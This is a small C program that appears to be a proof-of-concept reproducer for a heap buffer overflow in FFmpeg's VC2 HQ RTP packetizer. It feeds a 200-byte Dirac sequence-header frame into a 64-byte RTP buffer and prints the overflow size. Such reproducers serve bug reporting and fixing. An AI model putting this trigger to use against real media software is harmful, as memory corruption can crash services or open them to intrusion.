#include <stdio.h>

#include "libavutil/mem.h"
#include "libavcodec/golomb.c"
#include "libavformat/rtpenc_vc2hq.c"

#define FRAME_SIZE 200
#define RTP_PAYLOAD_SIZE 64
#define DATA_UNIT_PAYLOAD_SIZE (FRAME_SIZE - DIRAC_DATA_UNIT_HEADER_SIZE)
#define DESTINATION_WRITE_SIZE \
    (RTP_VC2HQ_PL_HEADER_SIZE + DATA_UNIT_PAYLOAD_SIZE)

void ff_rtp_send_data(AVFormatContext *format, const uint8_t *buffer,
                      int size, int marker)
{
}

int main(void)
{
    AVFormatContext format = { 0 };
    RTPMuxContext rtp = { 0 };
    uint8_t *frame = av_calloc(FRAME_SIZE, 1);

    rtp.buf = av_calloc(RTP_PAYLOAD_SIZE, 1);
    if (!frame || !rtp.buf)
        return 2;
    rtp.max_payload_size = RTP_PAYLOAD_SIZE;
    format.priv_data = &rtp;

    frame[4] = DIRAC_PCODE_SEQ_HEADER;
    AV_WB32(&frame[5], FRAME_SIZE);

    fprintf(stderr,
            "frame_size=%d unit_size=%d unit_payload_size=%d "
            "rtp_payload_size=%d destination_write_size=%d "
            "overflow_bytes=%d\n",
            FRAME_SIZE, FRAME_SIZE, DATA_UNIT_PAYLOAD_SIZE,
            RTP_PAYLOAD_SIZE, DESTINATION_WRITE_SIZE,
            DESTINATION_WRITE_SIZE - RTP_PAYLOAD_SIZE);
    fflush(stderr);

    ff_rtp_send_vc2hq(&format, frame, FRAME_SIZE, 0);
    return 0;
}
